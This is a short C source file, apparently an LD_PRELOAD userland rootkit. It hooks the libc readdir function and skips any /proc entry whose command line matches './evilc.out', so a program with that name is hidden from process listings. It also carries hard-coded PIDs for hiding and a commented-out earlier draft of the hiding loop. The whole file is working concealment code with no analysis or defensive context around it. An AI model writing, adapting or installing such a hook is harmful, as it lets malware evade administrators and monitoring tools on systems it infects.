#include <error.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>

#define __USE_GNU
#include <dlfcn.h>
#include <unistd.h>

static struct dirent *(*orig_readdir) (DIR *) = NULL;
static const char* hide_process = "6592";
static const char* hide_process2 = "6204";
static const char* hidde_name = "./evilc.out";

struct dirent *readdir (DIR * dirp){
   if (orig_readdir == NULL){
      orig_readdir = dlsym (RTLD_NEXT, "readdir");
      if (orig_readdir == NULL)
         error (1, errno, "dlsym");
      fprintf(stderr, "Catched\n");
   }

   //struct dirent* ret = orig_readdir(dirp);
   /*
   while (ret != NULL){
      char tmp[256];
      snprintf(tmp,sizeof(tmp),"/proc/%s/cmdline", ret->d_name);
      //printf(tmp);
      FILE* f = fopen(tmp,"r");
      char proc_name[100];
      if(f != NULL){
         fgets(proc_name, 100, f);
         //printf("%s\n", proc_name);
         fclose(f);
         if (strcmp(proc_name, hidde_name)==0){
            //ret = orig_readdir (dirp);
            continue;
         }
      }
      //fclose(f);
      //(strcmp(buffer, hidde_name) == 0)
      ret = orig_readdir (dirp);
   }*/
   struct dirent *ret;
   do{
     ret = orig_readdir (dirp);
     if (ret != NULL){
      char tmp[256];
      snprintf(tmp,sizeof(tmp),"/proc/%s/cmdline", ret->d_name);
      FILE* f = fopen(tmp,"r");
      char proc_name[100];
      if(f != NULL){
         fgets(proc_name, 100, f);
         //printf("%s\n", proc_name);
         fclose(f);
         if (strcmp(proc_name, hidde_name)==0){
            //ret = orig_readdir (dirp);
            continue;
         }

      }
     }
     break;
   }while(ret!=NULL);

   return ret;

}
